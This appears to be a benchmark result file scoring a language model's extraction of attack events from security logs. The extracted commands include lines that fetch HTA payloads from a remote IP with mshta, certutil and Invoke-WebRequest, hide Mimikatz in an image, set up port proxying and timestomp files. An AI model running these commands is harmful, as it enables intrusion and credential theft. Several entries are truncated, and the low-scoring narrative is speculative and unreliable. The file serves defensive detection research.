@@ -1,0 +1,116 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2606\u7acb\u968f\u6548\u3002ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "CertUtil.exe  -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item ",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\AtomicRedTeam\\atomics\\T1220\\bin\\msxsl.exe C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslxmlfile.xml C:\\AtomicRedTeam\\atomics\\T1220\\src\\msxslscript.xsl",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netsh  interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers gained initial access through PowerShell scripts (.ps1 files), likely delivered via spear phishing emails or exploited vulnerabilities. They escalated their privileges using another PowerShell script, possibly exploiting a vulnerability or using stolen credentials. The attackers then performed discovery, collecting information about the system and its configuration. To evade detection, they used encoded commands and deleted logs. They also collected data of interest to their goals. The attackers established command and control channels over HTTP and executed additional payloads, including an XML file processed by msxsl.exe. Finally, they maintained persistence through registry modifications.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 706,
+      "total_tokens": 59573,
+      "wall_clock_s": 30.786,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1875,
+      "recall": 0.21428571428571427,
+      "f1": 0.19999999999999998,
+      "tp": 3,
+      "fp": 13,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.0625,
+      "recall": 0.07142857142857142,
+      "f1": 0.06666666666666667,
+      "tp": 1,
+      "fp": 15,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.06666666666666667,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58867,
+      "completion_tokens": 706,
+      "total_tokens": 59573,
+      "wall_clock_s": 30.786,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
